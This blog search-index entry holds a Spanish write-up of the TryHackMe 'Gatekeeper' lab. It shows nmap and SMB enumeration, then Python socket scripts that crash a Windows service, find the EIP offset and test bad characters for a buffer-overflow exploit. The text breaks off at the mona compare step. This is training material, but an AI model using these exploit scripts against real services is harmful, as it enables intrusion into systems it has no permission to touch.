
{
    
    
    
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
    "pages": [{"date":"2023-10-02","image":"/images/post_pics/gatekeeper/gatekeeper.jpeg","link":"https://k3ssdev.github.io/posts/gatekeeper/","summary":"Introducción Gatekeeper es una máquina de TryHackMe que nos pide explotar una vulnerabilidad de buffer overflow en un binario de Windows sin apenas dar ninguna información sobre el objetivo ni sobre que tipo de binario puede ser. Esta sala es de dificultad \u0026ldquo;media\u0026rdquo; y requiere un esfuerzo adicional respecto a las anteriores para poder explotarla.","tags":["Buffer Overflow","Exploit Development","Immunity Debugger","Medium","Metasploit","Meterpreter","Mona","Privilege Escalation","Psexec","Python","Reverse Shell","TryHackMe","Windows"],"text":"introducción gatekeeper es una máquina de tryhackme que nos pide explotar una vulnerabilidad de buffer overflow en un binario de windows sin apenas dar ninguna información sobre el objetivo ni sobre que tipo de binario puede ser. esta sala es de dificultad \u0026ldquo;media\u0026rdquo; y requiere un esfuerzo adicional respecto a las anteriores para poder explotarla. sigue formando parte del bloque de buffer overflow del path \u0026ldquo;offensive pentesting\u0026rdquo; de tryhackme, por lo que es recomendable haber completado las anteriores salas de este bloque y haber recopilado unos buenos apuntes sobre el tema antes de meterse en faena.\nescaneo de puertos realizo un escaneo con nmap en dos pasos, primero un escaneo rápido para ver que puertos están abiertos y luego un escaneo completo de los puertos abiertos para obtener más información sobre los servicios que están corriendo en ellos.\nsudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.223.27 # nmap 7.94 scan initiated sun oct 1 20:39:03 2023 as: nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.223.27 increasing send delay for 10.10.223.27 from 0 to 5 due to 88 out of 292 dropped probes since last increase. increasing send delay for 10.10.223.27 from 5 to 10 due to 27 out of 89 dropped probes since last increase. increasing send delay for 10.10.223.27 from 10 to 20 due to 32 out of 105 dropped probes since last increase. increasing send delay for 10.10.223.27 from 20 to 40 due to 30 out of 98 dropped probes since last increase. increasing send delay for 10.10.223.27 from 320 to 640 due to 34 out of 112 dropped probes since last increase. warning: 10.10.223.27 giving up on port because retransmission cap hit (10). nmap scan report for 10.10.223.27 host is up (0.044s latency). not shown: 64219 closed tcp ports (reset), 1305 filtered tcp ports (no-response) port state service 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 31337/tcp open elite 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49161/tcp open unknown 49167/tcp open unknown read data files from: /usr/bin/../share/nmap # nmap done at sun oct 1 20:39:46 2023 -- 1 ip address (1 host up) scanned in 42.43 seconds sudo nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49167 -sc -sv -pn -on nmap_final 10.10.223.27 # nmap 7.94 scan initiated sun oct 1 20:39:46 2023 as: nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49167 -sc -sv -pn -on nmap_final 10.10.223.27 nmap scan report for 10.10.223.27 host is up (0.047s latency). port state service version 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 445/tcp open 0^m^f *�h��^m^a^a^a^e windows 7 professional 7601 service pack 1 microsoft-ds (workgroup: workgroup) 3389/tcp open tcpwrapped | rdp-ntlm-info: | target_name: gatekeeper | netbios_domain_name: gatekeeper | netbios_computer_name: gatekeeper | dns_domain_name: gatekeeper | dns_computer_name: gatekeeper | product_version: 6.1.7601 |_ system_time: 2023-10-01t18:42:24+00:00 | ssl-cert: subject: commonname=gatekeeper | not valid before: 2023-09-30t18:39:17 |_not valid after: 2024-03-31t18:39:17 |_ssl-date: 2023-10-01t18:42:39+00:00; 0s from scanner time. 31337/tcp open elite? | fingerprint-strings: | fourohfourrequest: | hello get /nice%20ports%2c/tri%6eity.txt%2ebak http/1.0 | hello | genericlines: | hello | hello | getrequest: | hello get / http/1.0 | hello | httpoptions: | hello options / http/1.0 | hello | help: | hello help | kerberos: | hello !!! | ldapsearchreq: | hello 0 | hello | lpdstring: | hello | default!!! | rtsprequest: | hello options / rtsp/1.0 | hello | sipoptions: | hello options sip:nm sip/2.0 | hello via: sip/2.0/tcp nm;branch=foo | hello from: \u0026lt;sip:nm@nm\u0026gt;;tag=root | hello to: \u0026lt;sip:nm2@nm2\u0026gt; | hello call-id: 50000 | hello cseq: 42 options | hello max-forwards: 70 | hello content-length: 0 | hello contact: \u0026lt;sip:nm@nm\u0026gt; | hello accept: application/sdp | hello | sslsessionreq, tlssessionreq, terminalservercookie: |_ hello 49152/tcp open msrpc microsoft windows rpc 49153/tcp open msrpc microsoft windows rpc 49154/tcp open msrpc microsoft windows rpc 49155/tcp open msrpc microsoft windows rpc 49161/tcp open msrpc microsoft windows rpc 49167/tcp open msrpc microsoft windows rpc 1 service unrecognized despite returning data. if you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : sf-port31337-tcp:v=7.94%i=7%d=10/1%time=6519bcfd%p=x86_64-pc-linux-gnu%r(g sf:etrequest,24,\u0026#34;hello\\x20get\\x20/\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r sf:(sipoptions,142,\u0026#34;hello\\x20options\\x20sip:nm\\x20sip/2\\.0\\r!!!\\nhello\\x20 sf:via:\\x20sip/2\\.0/tcp\\x20nm;branch=foo\\r!!!\\nhello\\x20from:\\x20\u0026lt;sip:nm@n sf:m\u0026gt;;tag=root\\r!!!\\nhello\\x20to:\\x20\u0026lt;sip:nm2@nm2\u0026gt;\\r!!!\\nhello\\x20call-id: sf:\\x2050000\\r!!!\\nhello\\x20cseq:\\x2042\\x20options\\r!!!\\nhello\\x20max-forw sf:ards:\\x2070\\r!!!\\nhello\\x20content-length:\\x200\\r!!!\\nhello\\x20contact: sf:\\x20\u0026lt;sip:nm@nm\u0026gt;\\r!!!\\nhello\\x20accept:\\x20application/sdp\\r!!!\\nhello\\x sf:20\\r!!!\\n\u0026#34;)%r(genericlines,16,\u0026#34;hello\\x20\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r(htt sf:poptions,28,\u0026#34;hello\\x20options\\x20/\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34; sf:)%r(rtsprequest,28,\u0026#34;hello\\x20options\\x20/\\x20rtsp/1\\.0\\r!!!\\nhello\\x20\\ sf:r!!!\\n\u0026#34;)%r(help,f,\u0026#34;hello\\x20help\\r!!!\\n\u0026#34;)%r(sslsessionreq,c,\u0026#34;hello\\x20\\ sf:x16\\x03!!!\\n\u0026#34;)%r(terminalservercookie,b,\u0026#34;hello\\x20\\x03!!!\\n\u0026#34;)%r(tlssess sf:ionreq,c,\u0026#34;hello\\x20\\x16\\x03!!!\\n\u0026#34;)%r(kerberos,a,\u0026#34;hello\\x20!!!\\n\u0026#34;)%r(fou sf:rohfourrequest,47,\u0026#34;hello\\x20get\\x20/nice%20ports%2c/tri%6eity\\.txt%2eba sf:k\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r(lpdstring,12,\u0026#34;hello\\x20\\x01de sf:fault!!!\\n\u0026#34;)%r(ldapsearchreq,17,\u0026#34;hello\\x200\\x84!!!\\nhello\\x20\\x01!!!\\n\u0026#34; sf:); service info: host: gatekeeper; os: windows; cpe: cpe:/o:microsoft:windows host script results: |_nbstat: netbios name: gatekeeper, netbios user: \u0026lt;unknown\u0026gt;, netbios mac: 02:38:c9:a6:8d:ed (unknown) | smb2-security-mode: | 2:1:0: |_ message signing enabled but not required | smb-os-discovery: | os: windows 7 professional 7601 service pack 1 (windows 7 professional 6.1) | os cpe: cpe:/o:microsoft:windows_7::sp1:professional | computer name: gatekeeper | netbios computer name: gatekeeper\\x00 | workgroup: workgroup\\x00 |_ system time: 2023-10-01t14:42:24-04:00 |_clock-skew: mean: 47m59s, deviation: 1h47m19s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-10-01t18:42:24 |_ start_date: 2023-10-01t18:38:50 service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at sun oct 1 20:42:40 2023 -- 1 ip address (1 host up) scanned in 174.33 seconds llama la atención el puerto 31337 que parece estar corriendo el binario objetivo. también es llamativo el servicio smb que está corriendo en el puerto 445. voy a intentar obtener información sobre el servicio smb y después comprobaré el binario que está corriendo en el puerto 31337.\npruebo el binario usando netcat y veo que se trata de un servidor que escucha en el puerto 31337 y que responde a los comandos que le envío con un \u0026ldquo;hello\u0026rdquo; y el string que le he enviado.\n❯ nc -vn frodo hello frodo!!! gollum hello gollum!!! enumeración smb usando smbclicent intento obtener información sobre el servicio smb, con el usuario guest y sin contraseña, usando las opciones -l y -n para listar los recursos compartidos y obtener información sobre el sistema operativo.\n❯ smbclient -l //10.10.223.27 -n sharename type comment --------- ---- ------- admin$ disk remote admin c$ disk default share ipc$ ipc remote ipc users disk reconnecting with smb1 for workgroup listing. do_connect: connection to 10.10.223.27 failed (error nt_status_resource_name_not_found) unable to connect with smb1 -- no workgroup available tras encontrar que el recurso compartido users existe, intento listar su contenido pero no tengo permisos para ello.\n❯ smbclient --user \u0026#34;guest\u0026#34; //10.10.223.27/users password for [workgroup\\guest]: try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . dr 0 fri may 15 03:57:08 2020 .. dr 0 fri may 15 03:57:08 2020 default dhr 0 tue jul 14 09:07:31 2009 desktop.ini ahs 174 tue jul 14 06:54:24 2009 share d 0 fri may 15 03:58:07 2020 7863807 blocks of size 4096. 3878843 blocks available encuentro el binario que debe estar corriendo en el puerto 31337, gatekeeper.exe, y lo descargo.\nsmb: \\share\\\u0026gt; ls . d 0 fri may 15 03:58:07 2020 .. d 0 fri may 15 03:58:07 2020 gatekeeper.exe a 13312 mon apr 20 07:27:17 2020 7863807 blocks of size 4096. 3878843 blocks available smb: \\share\\\u0026gt; mget gatekeeper.exe get file gatekeeper.exe? yes getting file \\share\\gatekeeper.exe of size 13312 as gatekeeper.exe (51,0 kilobytes/sec) (average 51,0 kilobytes/sec) análisis del binario paso el binario a una máquina virtual con windows 7 y con inmunity debugger para poder analizarlo. lo primero que hago es abrirlo con inmunity debugger y ver que tipo de binario es. en este caso es un binario de 32 bits. al ponerlo en marcha veo que se trata de un servidor que escucha en el puerto 31337. hago un nmap a mi maquina de pruebas con el binario funcionando para seguir analizándolo.\n❯ sudo nmap -scv -ss -p- -t4 192.168.1.109 starting nmap 7.94 ( https://nmap.org ) at 2023-10-01 21:22 cest nmap scan report for 192.168.1.109 host is up (0.00027s latency). not shown: 65529 filtered tcp ports (no-response) port state service version 135/tcp open msrpc microsoft windows rpc 139/tcp open netbios-ssn microsoft windows netbios-ssn 445/tcp open lu windows 7 professional 7601 service pack 1 microsoft-ds (workgroup: workgroup) 2869/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) 5357/tcp open http microsoft httpapi httpd 2.0 (ssdp/upnp) |_http-title: service unavailable |_http-server-header: microsoft-httpapi/2.0 31337/tcp open elite? | fingerprint-strings: | fourohfourrequest: | hello get /nice%20ports%2c/tri%6eity.txt%2ebak http/1.0 | hello | genericlines: | hello | hello | getrequest: | hello get / http/1.0 | hello | httpoptions: | hello options / http/1.0 | hello | help: | hello help | kerberos: | hello !!! | ldapsearchreq: | hello 0 | hello | lpdstring: | hello | default!!! | rtsprequest: | hello options / rtsp/1.0 | hello | sipoptions: | hello options sip:nm sip/2.0 | hello via: sip/2.0/tcp nm;branch=foo | hello from: \u0026lt;sip:nm@nm\u0026gt;;tag=root | hello to: \u0026lt;sip:nm2@nm2\u0026gt; | hello call-id: 50000 | hello cseq: 42 options | hello max-forwards: 70 | hello content-length: 0 | hello contact: \u0026lt;sip:nm@nm\u0026gt; | hello accept: application/sdp | hello | sslsessionreq, tlssessionreq, terminalservercookie: |_ hello 1 service unrecognized despite returning data. if you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : sf-port31337-tcp:v=7.94%i=7%d=10/1%time=6519c74f%p=x86_64-pc-linux-gnu%r(g sf:etrequest,24,\u0026#34;hello\\x20get\\x20/\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r sf:(sipoptions,142,\u0026#34;hello\\x20options\\x20sip:nm\\x20sip/2\\.0\\r!!!\\nhello\\x20 sf:via:\\x20sip/2\\.0/tcp\\x20nm;branch=foo\\r!!!\\nhello\\x20from:\\x20\u0026lt;sip:nm@n sf:m\u0026gt;;tag=root\\r!!!\\nhello\\x20to:\\x20\u0026lt;sip:nm2@nm2\u0026gt;\\r!!!\\nhello\\x20call-id: sf:\\x2050000\\r!!!\\nhello\\x20cseq:\\x2042\\x20options\\r!!!\\nhello\\x20max-forw sf:ards:\\x2070\\r!!!\\nhello\\x20content-length:\\x200\\r!!!\\nhello\\x20contact: sf:\\x20\u0026lt;sip:nm@nm\u0026gt;\\r!!!\\nhello\\x20accept:\\x20application/sdp\\r!!!\\nhello\\x sf:20\\r!!!\\n\u0026#34;)%r(genericlines,16,\u0026#34;hello\\x20\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r(htt sf:poptions,28,\u0026#34;hello\\x20options\\x20/\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34; sf:)%r(rtsprequest,28,\u0026#34;hello\\x20options\\x20/\\x20rtsp/1\\.0\\r!!!\\nhello\\x20\\ sf:r!!!\\n\u0026#34;)%r(help,f,\u0026#34;hello\\x20help\\r!!!\\n\u0026#34;)%r(sslsessionreq,c,\u0026#34;hello\\x20\\ sf:x16\\x03!!!\\n\u0026#34;)%r(terminalservercookie,b,\u0026#34;hello\\x20\\x03!!!\\n\u0026#34;)%r(tlssess sf:ionreq,c,\u0026#34;hello\\x20\\x16\\x03!!!\\n\u0026#34;)%r(kerberos,a,\u0026#34;hello\\x20!!!\\n\u0026#34;)%r(fou sf:rohfourrequest,47,\u0026#34;hello\\x20get\\x20/nice%20ports%2c/tri%6eity\\.txt%2eba sf:k\\x20http/1\\.0\\r!!!\\nhello\\x20\\r!!!\\n\u0026#34;)%r(lpdstring,12,\u0026#34;hello\\x20\\x01de sf:fault!!!\\n\u0026#34;)%r(ldapsearchreq,17,\u0026#34;hello\\x200\\x84!!!\\nhello\\x20\\x01!!!\\n\u0026#34; sf:); mac address: 08:00:27:39:30:46 (oracle virtualbox virtual nic) service info: host: usuario-pc; os: windows; cpe: cpe:/o:microsoft:windows host script results: |_nbstat: netbios name: usuario-pc, netbios user: \u0026lt;unknown\u0026gt;, netbios mac: 08:00:27:39:30:46 (oracle virtualbox virtual nic) |_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s | smb2-time: | date: 2023-10-01t19:26:24 |_ start_date: 2023-10-01t19:15:01 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ message signing enabled but not required | smb-os-discovery: | os: windows 7 professional 7601 service pack 1 (windows 7 professional 6.1) | os cpe: cpe:/o:microsoft:windows_7::sp1:professional | computer name: usuario-pc | netbios computer name: usuario-pc\\x00 | workgroup: workgroup\\x00 |_ system time: 2023-10-01t21:26:25+02:00 service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 286.07 seconds pruebo el binario conectandome con netcat, observo el mismo comportamiento que en la máquina de tryhackme. supongo que los mensajes que acepte el binario deben tener un límite de caracteres, por lo que pruebo a enviarle un mensaje de 800 caracteres y veo que se rompe.\n❯ nc -vn 192.168.1.109 31337 connection to 192.168.1.109 31337 port [tcp/*] succeeded! hello hello hello!!! sam hello sam!!! frodo hello frodo!!! gollum hello gollum!!! con este script, preparo un payload de 800 caracteres y lo envío al binario. en el eip se puede ver el valor 41414141 que son las a\n❯ python -c \u0026#39;print(\u0026#34;a\u0026#34; * 800)\u0026#39; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ❯ nc -vn 192.168.1.109 31337 connection to 192.168.1.109 31337 port [tcp/*] succeeded! hi hello hi!!! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa reviso inmunity debugger y compruebo el resultado obtenido en la dirección eip. en el registro eip se puede ver el valor 41414141 que son las a que he enviado en el payload.\neax ffffffff ecx 7efda000 edx 00002736 ebx 005cf400 esp 021319f8 ascii \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ebp 41414141 esi 08041470 gatekeep.08041470 edi 005cf400 eip 41414141 c 0 es 002b 32bit 0(ffffffff) p 1 cs 0023 32bit 0(ffffffff) a 0 ss 002b 32bit 0(ffffffff) z 0 ds 002b 32bit 0(ffffffff) s 1 fs 0053 32bit 7efda000(fff) t 0 gs 002b 32bit 0(ffffffff) d 0 o 0 lasterr wsaenotsock (00002736) efl 00010286 (no,nb,ne,a,s,pe,l,le) st0 empty g st1 empty g st2 empty g st3 empty g st4 empty g st5 empty g st6 empty g st7 empty g 3 2 1 0 e s p u o z d i fst 0000 cond 0 0 0 0 err 0 0 0 0 0 0 0 0 (gt) fcw 027f prec near,53 mask 1 1 1 1 1 1 sabiendo esto, preparo un script de python para enviar un payload de 800 caracteres y comprobar si puedo sobreescribir el eip con el valor 42424242 que son las b. en el registro eip se puede ver el valor 42424242 que son las b que he enviado en el payload.\n❯ msf-pattern_create -l 800 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag6ag7ag8ag9ah0ah1ah2ah3ah4ah5ah6ah7ah8ah9ai0ai1ai2ai3ai4ai5ai6ai7ai8ai9aj0aj1aj2aj3aj4aj5aj6aj7aj8aj9ak0ak1ak2ak3ak4ak5ak6ak7ak8ak9al0al1al2al3al4al5al6al7al8al9am0am1am2am3am4am5am6am7am8am9an0an1an2an3an4an5an6an7an8an9ao0ao1ao2ao3ao4ao5ao6ao7ao8ao9ap0ap1ap2ap3ap4ap5ap6ap7ap8ap9aq0aq1aq2aq3aq4aq5aq6aq7aq8aq9ar0ar1ar2ar3ar4ar5ar6ar7ar8ar9as0as1as2as3as4as5as6as7as8as9at0at1at2at3at4at5at6at7at8at9au0au1au2au3au4au5au6au7au8au9av0av1av2av3av4av5av6av7av8av9aw0aw1aw2aw3aw4aw5aw6aw7aw8aw9ax0ax1ax2ax3ax4ax5ax6ax7ax8ax9ay0ay1ay2ay3ay4ay5ay6ay7ay8ay9az0az1az2az3az4az5az6az7az8az9ba0ba1ba2ba3ba4ba5ba pero antes necesito conseguir el offset para saber cuantos caracteres tengo que enviar para sobreescribir el eip. para ello, envío el payload de 800 caracteres y obtengo el valor del esp para calcular el offset.\nimport socket ip = \u0026#34;192.168.1.109\u0026#34; port = 31337 prefix = \u0026#34;k3ss \u0026#34; offset = 0 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af\u0026gt; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) # s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) con el valor del esp y la longitud del payload, obtengo el offset usando msf-pattern_offset.\n❯ msf-pattern_offset -q 41376541 -l 800 [*] exact match at offset 141 actualizo el script de python con el offset y compruebo que puedo sobreescribir el eip con el valor 42424242 que son las b. esta vez no incluyo nada en el payload para comprobar que el eip se ha sobreescribido correctamente.\nimport socket ip = \u0026#34;192.168.1.109\u0026#34; port = 31337 prefix = \u0026#34;k3ss \u0026#34; offset = 141 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;bbbb\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;\u0026#34; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) # s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) veo que el script ha funcionado correctamente, el eip se ha sobreescribido con el valor 42424242 que son las b.\neax ffffffff ecx 7efda000 edx 00002736 ebx 005ef400 esp 005019f8 ascii \u0026#34; !!! \u0026#34; ebp 41414141 esi 08041470 gatekeep.08041470 edi 005ef400 eip 42424242 c 0 es 002b 32bit 0(ffffffff) p 1 cs 0023 32bit 0(ffffffff) a 0 ss 002b 32bit 0(ffffffff) z 0 ds 002b 32bit 0(ffffffff) s 1 fs 0053 32bit 7efda000(fff) t 0 gs 002b 32bit 0(ffffffff) d 0 o 0 lasterr wsaenotsock (00002736) efl 00010286 (no,nb,ne,a,s,pe,l,le) st0 empty g st1 empty g st2 empty g st3 empty g st4 empty g st5 empty g st6 empty g st7 empty g 3 2 1 0 e s p u o z d i fst 0000 cond 0 0 0 0 err 0 0 0 0 0 0 0 0 (gt) fcw 027f prec near,53 mask 1 1 1 1 1 1 ahora vamos a buscar los badcharacters. estos son los caracteres que no se pueden enviar al binario porque pueden estropear el shellcode que envíe finalmente en mi payload. para ello, preparo un script de python que envía todos los caracteres posibles y compruebo que no se rompe el binario. en este caso, el binario se rompe con el caracter 00.\nfor x in range(1, 256): print(\u0026#34;\\\\x\u0026#34; + \u0026#34;{:02x}\u0026#34;.format(x), end=\u0026#39;\u0026#39;) print() ❯ python3 bytearray.py \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff import socket ip = \u0026#34;192.168.1.109\u0026#34; port = 31337 prefix = \u0026#34;k3ss \u0026#34; offset = 141 overflow = \u0026#34;a\u0026#34; * offset retn = \u0026#34;bbbb\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\\u0026gt; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.af_inet, socket.sock_stream) try: s.connect((ip, port)) print(\u0026#34;sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) # s.recv(1024) print(\u0026#34;done!\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) antes de lanzar el exploit, ejecuto el comando !mona bytearray para generar un fichero con los caracteres buscados, empezando por el \\x00, y luego ejecuto el comando !mona compare para comprobar que caracteres son los que no se pueden enviar al binario. en este caso, el binario se rompe con el caracter \\x00 y \\x0a.\n!mona bytearray -b \u0026#34;\\x00\u0026#34; !mona compare -f c:\\mona\\gatekeeper\\\\bytearray.bin 